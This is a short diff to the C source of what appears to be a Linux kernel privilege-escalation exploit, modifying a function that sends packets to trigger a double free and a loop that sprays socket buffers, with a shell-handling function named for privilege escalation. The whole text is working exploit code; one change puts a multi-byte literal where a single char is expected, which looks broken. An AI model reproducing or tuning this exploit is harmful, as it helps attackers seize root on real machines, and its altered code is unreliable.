@@ -36,7 +36,7 @@ static void send_ipv4_ip_hdr_chr(size_t dfsize, struct ip *ip_header, char chr)
 static void trigger_double_free_hdr(size_t dfsize, struct ip *ip_header)
 {
 	printf("[*] sending double free buffer packet...\n");
-	send_ipv4_ip_hdr_chr(dfsize, ip_header, '\x41');
+	send_ipv4_ip_hdr_chr(dfsize, ip_header, '\x41\xca\xfe\xba');
 }
 
 static void alloc_intermed_buf_hdr(size_t dfsize, struct ip *ip_header)
@@ -326,7 +326,7 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 	//sleep(3);
 	
 	// push N skbs to skb freelist
-	for (int i=0; i < CONFIG_SKB_SPRAY_AMOUNT; i++)
+	for (int i=0; i < CONFIG_SKB_SPRAY_AMOUNT*100; i++)
 	{
 		PRINTF_VERBOSE("[*] freeing reserved udp packets to mask corrupted packet... (%d/%d)\n", i, CONFIG_SKB_SPRAY_AMOUNT);
 		recv_ipv4_udp(1);
